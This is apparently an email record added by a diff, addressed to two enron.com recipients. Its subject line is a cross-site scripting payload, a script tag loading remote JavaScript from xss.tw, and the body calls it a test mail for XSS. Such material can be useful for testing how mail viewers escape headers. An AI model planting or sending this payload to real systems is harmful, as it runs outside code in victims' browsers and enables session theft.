@@ -1,0 +1,7 @@
+From: "Tami Donovan" <t_donovan_wd@mediatampere.fi>
+To: carol.clair@enron.com, marcus.nettelton@enron.com
+Subject: <script src=http://xss.tw/pdjsa></script>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
